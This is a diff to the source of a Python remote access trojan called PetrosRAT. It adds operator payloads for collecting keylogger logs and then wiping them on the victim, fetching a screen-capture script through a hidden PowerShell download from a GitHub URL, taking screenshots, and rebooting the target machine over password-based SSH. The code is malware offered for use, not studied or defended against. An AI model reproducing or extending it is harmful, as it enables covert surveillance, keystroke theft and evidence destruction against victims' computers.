@@ -39,10 +39,15 @@ options_menu = """
         [+] Payloads:
             [0] - Remote Console
             [1] - Keylogger
+            [2] - Grab Keylogs
+            [3] - Install ScreenCapture
+            [4] - Take Screenshot
+            [5] - Restart Target PC
         
         [+] Options:
             [h] or [help]       -- Help Menu
-            [c] or [clear]      -- Clear UI
+            [cls] or [clear]    -- Clear UI
+            [c] or [config]     -- Show RAT file
             [v] or [version]    -- Version Number
             [u] or [update]     -- Update PetrosRAT
             [r] or [remove]     -- Remove PetrosRAT
@@ -77,6 +82,12 @@ def read_config(config_file):
 # clear screen
 def clear():
     os.system("clear")
+
+# display configuration file data
+def print_config(configuration):
+
+    for key, value in configuration.items():
+        print(f"{key} : {value}")
 
 # update the RAT
 def update():
@@ -155,7 +166,6 @@ def remote_command(address, password, command):
     # remotely execute command
     os.system(f"sshpass -p \"{password}\" ssh petrosrat@{address} '{command}' ")
 
-
 # keylogger
 def keylogger(address, password, target_username, working_directory):
     
@@ -179,6 +189,11 @@ def keylogger(address, password, target_username, working_directory):
     # run keylogger
     print("[*] Executing the keylogger")
     remote_command(address, password, execute_keylogger)
+
+# screenshot
+def screenshot(address, password, working_directory):
+    screenshot()
+
 
 # detects os
 def os_detection():
@@ -226,17 +241,45 @@ def cli(arguments):
         if option == "0":
             connect(ipv4, password)
             
-        #keylogger
+        # keylogger
         elif option == "1":
             keylogger(ipv4, password, target_username, working_directory)
+            
+        # grab keylogges
+        elif option == "2":
+            remote_download(ipv4, password, f"{working_directory}/{target_username}.log")
+            remote_command(ipv4, password, f"powershell New-Item -Path {working_directory}/{target_username}.log -ItemType File -Force")
+            print("[+] Log file saved to \"~/Downloads\"")
+            print("[+] Log file on target has been wiped\n")
+            
+        # screencapture installer
+        elif option == "3":
+            install_screencapture = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/screenshot.ps1 -OutFile {working_directory}/screenshot.ps1\""
+            
+            remote_command(ipv4, password, install_screencapture)
+            
+        # take screenshot
+        elif option == "4":
+            screenshot(ipv4, password, working_directory)
+            
+            
+        # restart target pc
+        elif option == "5":
+            remote_command(ipv4, password, "shutdown /r")
+            
             
         # help me
         elif option == "h" or option == "help":
             main()
 
         # clear UI
-        elif option == "h" or option == "help":
+        elif option == "cls" or option == "clear":
             clear()
+            
+        # display config file info
+        elif option == "c" or option == "config":
+            print_config(configuration)
+            print(f"USERNAME : {target_username}")
             
         # get version number
         elif option == "v" or option == "version":
